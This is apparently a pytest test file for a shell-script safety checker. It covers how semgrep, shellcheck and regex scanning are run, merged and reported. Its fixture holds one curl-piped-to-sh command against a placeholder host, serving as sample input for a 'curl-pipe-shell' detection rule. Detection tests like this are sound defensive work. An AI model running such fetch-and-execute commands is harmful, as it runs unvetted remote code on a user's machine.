"""run_static orchestration: which tools run, notices, fallback, merging."""

from __future__ import annotations

import pytest
from pytest_mock import MockerFixture

from chkscript.models import Finding, Severity
from chkscript.preprocess import preprocess
from chkscript.static import run_static, semgrep, shellcheck
from chkscript.static.semgrep import SemgrepOutcome

BUNDLE = preprocess(b"#!/bin/bash\ncurl -fsSL https://x.example/i.sh | sh\n")


def _semgrep_finding() -> Finding:
    return Finding(
        severity=Severity.UNSAFE,
        description="d",
        source="semgrep",
        rule_id="curl-pipe-shell",
        line=2,
    )


@pytest.fixture
def no_shellcheck(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(shellcheck, "available", lambda: False)


@pytest.mark.usefixtures("no_shellcheck")
def test_missing_shellcheck_is_a_notice_not_an_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(semgrep, "available", lambda: False)
    result = run_static(BUNDLE)
    assert "shellcheck" not in result.tools
    assert any("shellcheck not found" in n for n in result.notices)


@pytest.mark.usefixtures("no_shellcheck")
def test_complete_semgrep_run_skips_regex(
    monkeypatch: pytest.MonkeyPatch, mocker: MockerFixture
) -> None:
    monkeypatch.setattr(semgrep, "available", lambda: True)
    mocker.patch.object(
        semgrep, "run", return_value=SemgrepOutcome(findings=[_semgrep_finding()])
    )
    result = run_static(BUNDLE)
    assert result.tools == ["semgrep"]
    assert [f.merged_from for f in result.findings] == [["semgrep"]]


@pytest.mark.usefixtures("no_shellcheck")
def test_incomplete_semgrep_run_adds_regex_and_merges(
    monkeypatch: pytest.MonkeyPatch, mocker: MockerFixture
) -> None:
    monkeypatch.setattr(semgrep, "available", lambda: True)
    mocker.patch.object(
        semgrep,
        "run",
        return_value=SemgrepOutcome(findings=[_semgrep_finding()], complete=False),
    )
    result = run_static(BUNDLE)
    assert result.tools == ["semgrep", "regex"]
    [pipe] = [f for f in result.findings if f.rule_id == "curl-pipe-shell"]
    assert pipe.merged_from == ["semgrep", "regex"]


def test_shellcheck_failure_is_a_notice(
    monkeypatch: pytest.MonkeyPatch, mocker: MockerFixture
) -> None:
    monkeypatch.setattr(shellcheck, "available", lambda: True)
    monkeypatch.setattr(semgrep, "available", lambda: False)
    mocker.patch.object(
        shellcheck, "run", side_effect=shellcheck.ShellcheckError("exit 3")
    )
    result = run_static(BUNDLE)
    assert result.tools == ["regex"]
    assert any("shellcheck failed" in n for n in result.notices)
